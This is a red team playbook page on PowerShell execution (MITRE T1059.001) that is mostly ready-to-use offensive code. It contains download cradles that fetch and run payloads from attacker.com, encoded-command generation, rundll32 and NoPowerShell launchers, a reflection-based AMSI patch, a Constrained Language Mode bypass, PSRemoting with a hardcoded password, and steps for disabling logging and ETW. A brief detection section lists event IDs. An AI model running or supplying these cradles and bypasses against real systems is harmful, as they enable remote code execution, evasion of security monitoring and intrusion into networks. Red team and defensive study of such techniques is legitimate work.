# PowerShell Execution Techniques

> **MITRE ATT&CK**: Execution > T1059.001 - Command and Scripting Interpreter: PowerShell
> **Platforms**: Windows
> **Required Privileges**: User (most techniques), Admin (some bypass methods)
> **OPSEC Risk**: Medium-High (heavily monitored by EDR, SIEM, and SOC teams)

---

## Strategic Overview

PowerShell remains the most versatile execution engine on Windows, offering direct access to the .NET framework, COM objects, WMI, and the Windows API. As a Red Team Lead, you must recognize that PowerShell is also the most monitored attack surface in modern environments. Every mature SOC has ScriptBlock logging, AMSI, and Constrained Language Mode deployed. The strategic value lies not in avoiding PowerShell entirely but in understanding which execution patterns evade detection and when to use alternatives. Operators should default to PowerShell only when stealth is not the primary concern or when bypass techniques are confirmed effective against the target's defensive stack.

## Technical Deep-Dive

### Download Cradles

Download cradles fetch and execute payloads in memory without writing to disk.

```powershell
# Classic WebClient cradle - most commonly flagged
IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/payload.ps1')

# Invoke-WebRequest (PowerShell 3.0+)
IEX (Invoke-WebRequest -Uri 'https://attacker.com/payload.ps1' -UseBasicParsing).Content

# Shorter alias form
IEX (iwr https://attacker.com/payload.ps1 -useb).Content

# Download as byte array - useful for binary payloads
$data = (New-Object Net.WebClient).DownloadData('https://attacker.com/payload.dll')
[System.Reflection.Assembly]::Load($data)

# XML cradle - less commonly flagged
$x = New-Object Xml.XmlDocument
$x.Load('https://attacker.com/config.xml')
IEX $x.command.execute

# COM object cradle - avoids Net.WebClient signature
$c = New-Object -ComObject MsXml2.ServerXmlHttp
$c.Open('GET','https://attacker.com/payload.ps1',$false)
$c.Send()
IEX $c.ResponseText
```

### Encoded Commands

```powershell
# Base64 encoded command execution
powershell.exe -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIA...

# Generate encoded command
$cmd = "IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/p.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
Write-Output "powershell -enc $encoded"
```

### PowerShell Without powershell.exe

When powershell.exe is blocked or monitored, load the engine directly.

```csharp
// C# - Load System.Management.Automation.dll directly
using System.Management.Automation;
using System.Management.Automation.Runspaces;

Runspace rs = RunspaceFactory.CreateRunspace();
rs.Open();
Pipeline pipeline = rs.CreatePipeline();
pipeline.Commands.AddScript("Get-Process");
Collection<PSObject> results = pipeline.Invoke();
```

```powershell
# PowerShdll - Run PowerShell via rundll32
rundll32.exe PowerShdll.dll,main "IEX (New-Object Net.WebClient).DownloadString('https://attacker.com/p.ps1')"

# NoPowerShell - .NET-based PS alternative that logs nothing
NoPowerShell.exe Get-Process
NoPowerShell.exe Invoke-WebRequest -Uri https://attacker.com/payload.ps1
```

### AMSI Bypass

AMSI (Antimalware Scan Interface) inspects PowerShell scripts at runtime. See `06-defense-evasion/amsi-bypass.md` for full coverage. Quick reference:

```powershell
# Reflection-based AMSI patch (set amsiInitFailed = true)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Note: The above string is itself flagged by AMSI. Operators must
# obfuscate variable names and use string concatenation or encoding.
```

### Constrained Language Mode Bypass

```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode

# If ConstrainedLanguage, methods to bypass:
# 1. Use PowerShell v2 (if available, no CLM enforcement)
powershell.exe -version 2 -command "IEX ..."

# 2. Run from an AppLocker-approved directory
# 3. Use custom runspace via C# (avoids CLM entirely)
# 4. Use PSByPassCLM tool
```

### PSRemoting for Execution

```powershell
# Execute on remote host via PSRemoting (WinRM)
Invoke-Command -ComputerName TARGET -ScriptBlock { whoami; hostname }

# With credentials
$cred = New-Object PSCredential('DOMAIN\user', (ConvertTo-SecureString 'Pass123!' -AsPlainText -Force))
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { Get-Process }

# Enter interactive session
Enter-PSSession -ComputerName TARGET -Credential $cred
```

### Reflection-Based Loading

```powershell
# Load .NET assembly reflectively into current process
$bytes = [IO.File]::ReadAllBytes("C:\temp\payload.dll")
[Reflection.Assembly]::Load($bytes)

# Invoke specific method from loaded assembly
$assembly = [Reflection.Assembly]::Load($bytes)
$type = $assembly.GetType('Namespace.ClassName')
$method = $type.GetMethod('Execute')
$method.Invoke($null, @("arg1", "arg2"))
```

## Detection & Evasion

### Detection Mechanisms
- **ScriptBlock Logging** (Event ID 4104): Logs deobfuscated script content
- **Module Logging** (Event ID 4103): Logs pipeline execution details
- **Transcription Logging**: Writes all PS activity to text files on disk
- **AMSI**: Real-time script content inspection before execution
- **ETW (Event Tracing for Windows)**: PowerShell provider traces

### Evasion Techniques
- Disable ScriptBlock Logging via Group Policy modification or registry
- Patch ETW provider in-memory to suppress event generation
- Use unmanaged PowerShell runspaces from C# to bypass most logging
- Downgrade to PowerShell v2 where logging features do not exist
- Use string concatenation and variable substitution to break static signatures
- Avoid `Invoke-Expression` and `IEX` aliases; use `& ([scriptblock]::Create(...))` instead

### OPSEC Considerations
- PowerShell v5+ environments log almost everything by default
- Parent-child process relationships are scrutinized (cmd.exe spawning powershell.exe)
- Network connections from powershell.exe are high-fidelity alerts in most SOCs
- Prefer in-process .NET execution or BOF (Beacon Object Files) over PowerShell when stealth is critical

## Cross-References

- `03-execution/dotnet-execution.md` - .NET-based alternatives to PowerShell
- `06-defense-evasion/amsi-bypass.md` - AMSI bypass techniques in detail
- `09-lateral-movement/` - PSRemoting for lateral movement
- `03-execution/lolbins.md` - Alternative execution via system binaries

## References

- Microsoft PowerShell Documentation: https://docs.microsoft.com/en-us/powershell/
- PowerShell Logging Cheat Sheet: https://www.malwarearchaeology.com/cheat-sheets
- AMSI Bypass Research: https://amsi.fail
- PowerShdll: https://github.com/p3nt4/PowerShdll
- NoPowerShell: https://github.com/bitsadmin/nopowershell
